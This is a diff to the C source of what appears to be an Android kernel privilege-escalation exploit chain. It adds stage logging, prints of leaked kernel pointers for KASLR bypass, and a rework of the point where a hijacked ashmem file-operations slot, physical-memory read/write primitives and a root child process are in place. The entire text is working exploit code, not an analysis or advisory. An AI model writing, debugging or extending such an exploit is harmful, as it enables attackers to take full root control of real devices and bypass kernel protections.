@@ -1,5 +1,20 @@
 #include "common.h"
 
+/* E63: durable stage journal — survives OOM-kill/SIGKILL of the process. */
+#include <fcntl.h>
+static void stage_mark(const char *tag) {
+  char line[96];
+  int n = snprintf(line, sizeof(line), "%llu %s\n",
+                   (unsigned long long)time(NULL), tag);
+  int fd = open("/data/local/tmp/chain_stages.log",
+                O_WRONLY | O_APPEND | O_CREAT | O_CLOEXEC, 0666);
+  if (fd >= 0) {
+    if (write(fd, line, (size_t)n) >= 0)
+      fdatasync(fd);
+    close(fd);
+  }
+}
+
 #define PSELECT_CFI_ROUTE_ATTEMPTS 8
 #define PSELECT_EXPECTED_READY 9
 #define MAIN_TCP_PUNCH_SHMEM_LEN (16 * 1024 * 1024)
@@ -701,11 +716,20 @@ int leak_kernel_base(int fd) {
   kaslr_release_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_RELEASE_OFF);
   kaslr_show_fdinfo_ptr =
     kernel_read64(fd, kaslr_fops_alias + FOPS_SHOW_FDINFO_OFF);
+  pr_info("leak_kernel_base alias=%016llx open=%016llx ioctl=%016llx "
+          "mmap=%016llx release=%016llx fdinfo=%016llx\n",
+          (unsigned long long)kaslr_fops_alias,
+          (unsigned long long)kaslr_open_ptr,
+          (unsigned long long)kaslr_ioctl_ptr,
+          (unsigned long long)kaslr_mmap_ptr,
+          (unsigned long long)kaslr_release_ptr,
+          (unsigned long long)kaslr_show_fdinfo_ptr);
 
   if (!is_kernel_ptr(kaslr_open_ptr) || !is_kernel_ptr(kaslr_ioctl_ptr) ||
       !is_kernel_ptr(kaslr_mmap_ptr) || !is_kernel_ptr(kaslr_release_ptr) ||
       !is_kernel_ptr(kaslr_show_fdinfo_ptr)) {
     kaslr_step = 1;
+    pr_info("leak_kernel_base FAIL step=1 (non-kernel ptr)\n");
     return 0;
   }
 
@@ -723,16 +747,25 @@ int leak_kernel_base(int fd) {
       kaslr_show_fdinfo_ptr != kaslr_expected_show_fdinfo) {
     kaslr_done = 0;
     kaslr_step = 2;
+    pr_info("leak_kernel_base FAIL step=2 base=%016llx slide=%016llx "
+            "exp_ioctl=%016llx\n",
+            (unsigned long long)kaslr_base,
+            (unsigned long long)kaslr_slide,
+            (unsigned long long)kaslr_expected_ioctl);
     return 0;
   }
 
   if (!refresh_fake_fops_text(fd)) {
     kaslr_done = 0;
     kaslr_step = 3;
+    pr_info("leak_kernel_base FAIL step=3 (refresh)\n");
     return 0;
   }
 
   kaslr_step = 0;
+  stage_mark("stage leak-refresh-OK");
+  pr_info("leak_kernel_base OK base=%016llx slide=%016llx\n",
+          (unsigned long long)kaslr_base, (unsigned long long)kaslr_slide);
   return 1;
 }
 
@@ -809,6 +842,7 @@ int try_cfi_stage(void) {
   dirty = 1;
   cfi_dirty_seen = 1;
 
+  stage_mark("stage llseek-begin");
   if (!repair_fake_fops_llseek(fd)) {
     cfi_last_step = 2;
     cfi_last_errno = errno;
@@ -839,12 +873,14 @@ int try_cfi_stage(void) {
     goto fail;
   }
 
+  stage_mark("stage bootid-begin");
   if (!restore_slide_boot_id(fd)) {
     cfi_last_step = 10;
     cfi_last_errno = errno;
     goto fail;
   }
 
+  stage_mark("stage leak-begin");
   if (!leak_kernel_base(fd)) {
     cfi_last_step = 9;
     cfi_last_errno = errno;
@@ -858,6 +894,7 @@ int try_cfi_stage(void) {
     if (attempt != 0) {
       reset_pipe_attempt();
     }
+    stage_mark("stage childroot-try");
     if (install_child_root(fd)) {
       installed = 1;
       break;
@@ -875,19 +912,40 @@ int try_cfi_stage(void) {
   }
 
   /* SEAM: fops hijack live, physrw armed, root child confirmed.
-   * The server serves kernel-virt + phys memory from THIS process and
-   * never returns; the ashmem fops restore below is therefore skipped. */
+   * NO-SERVER mode: the standalone miniserver replaces the in-chain
+   * server. Nothing uses the ashmem gadget after this point (the
+   * miniserver serves from pipe buffers, the root child is done), so
+   * the global misc fops slot is restored to the canonical ops and the
+   * fake struct's owner is nulled. Keeping the slot aimed at a
+   * userspace page crashes the kernel in misc_open ->
+   * fops_get -> try_module_get(f_op->owner) as soon as the owning
+   * process dies, the page is reused, and any app reopens
+   * /dev/ashmem — observed twice on device (E64). */
   if (physrw_read64_ok != 0 && physrw_write64_ok != 0) {
-    /* payload_runner_main armed PDEATHSIG=SIGKILL: if the launcher process
-     * exits (adb session teardown, script timeout), the freshly launched
-     * server dies silently — KILL is uncatchable, physrw.log never sees it.
-     * From here on the server must outlive its parent. */
-    if (prctl(PR_SET_PDEATHSIG, 0) == 0) {
-      pr_info("pdeathsig cleared for server survival ppid=%d\n",
-              (int)getppid());
-    }
-    pr_success("physrw-server launching at seam fd=%d\n", fd);
-    physrw_server_launch(fd, misc_fops, canon_addr(ASHMEM_FOPS));
+    uint64_t original_fops_seam =
+      kaslr_done ? canon_addr(ASHMEM_FOPS) : p0_data_alias(ASHMEM_FOPS);
+    ssize_t restore_seam = configfs_write_once(
+        fd, misc_fops, &original_fops_seam, sizeof(original_fops_seam));
+    uint64_t after_seam = 0;
+    int seam_ok =
+      restore_seam == (ssize_t)sizeof(original_fops_seam) &&
+      configfs_read_once(fd, misc_fops, &after_seam, sizeof(after_seam)) ==
+        (ssize_t)sizeof(after_seam) &&
+      after_seam == original_fops_seam;
+    uint64_t null_owner_seam = 0;
+    ssize_t owner_seam = configfs_write_once(
+        fd, fake_fops, &null_owner_seam, sizeof(null_owner_seam));
+    cfi_restore_ret = restore_seam;
+    cfi_owner_ret = owner_seam;
+    pr_info("seam restore misc_fops=%zd after=%016llx ok=%d owner=%zd\n",
+            (ssize_t)restore_seam, (unsigned long long)after_seam, seam_ok,
+            (ssize_t)owner_seam);
+    stage_mark(seam_ok ? "stage seam-defuse-OK"
+                       : "stage seam-defuse-FAIL");
+    pr_success("noserver seam done fd=%d gadget defused\n", fd);
+    stage_mark("stage seam-noserver-exit");
+    close(fd);
+    return 1;
   }
 
   uint64_t original_fops = canon_addr(ASHMEM_FOPS);
